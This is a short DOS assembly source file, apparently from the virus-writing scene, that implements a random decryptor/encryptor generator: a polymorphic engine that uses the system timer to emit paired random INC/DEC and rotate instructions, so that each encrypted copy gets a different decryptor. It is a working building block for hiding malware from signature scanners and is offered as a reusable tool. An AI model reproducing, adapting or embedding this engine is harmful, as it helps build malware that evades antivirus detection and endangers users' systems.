;-----------------------------------------------------
; RDCG v0.1
;-----------------------------------------------------
;- BzZ Random De- Cryptor Generator by B!Z0n //[BzZ] -
;-----------------------------------------------------
; Input  : DS:SI - End of Cryptor
;	 : ES:DI - Start of Decryptor
;	 : CX	 - Num of De- Crypt command length
; Output : ES:SI - Start of Cryptor
;	 : ES:DI - End of Decryptor
;	 : CX	 - Len of Decryptor (Encryptor) Bytes
;	 : AX, SI,DI - destroyed
;----------------------------------------------------
RDCG   proc	near
       mov	byte ptr [si], 0C3h
       push	si
@0:
       call	codegen
       loop	@0
       pop	cx
       sub	cx, si
       ret
;-------------------------------------
;BzZ_RDCG	 db  0,'[BzZ RDCG]',0
;-------------------------------------
codegen:
       in	al, 40h
       shr	al, 7
       jne	@1
       call	incdec
       ret
@1:    call	rox
       ret
;-------------------------------------
INCDEC	proc	near
	sub	si, 02h
	in	ax, 40h
	and	ax, 0000110111111110b
	or	ax, 0000010111111110b
	stosw
	xor	ah, 11110111b
	not	ah
	xchg	si, di
	stosw
	xchg	si, di
	sub	si, 02h
	ret
INCDEC	endp
;-------------------------------------
ROX	proc	near
	sub	si, 03h
	in	ax, 40h
	and	ax, 0000110111000000b
	or	ax, 0000010111000000b
	stosw
	xor	ah, 11110111b
	not	ah
	xchg	si, di
	stosw
	xchg	si, di
	in	al, 40h
	stosb
	xchg	si, di
	stosb
	xchg	si, di
	sub	si, 03h
	ret
ROX	endp
RDCG	endp
;------------------------------------------------------------------
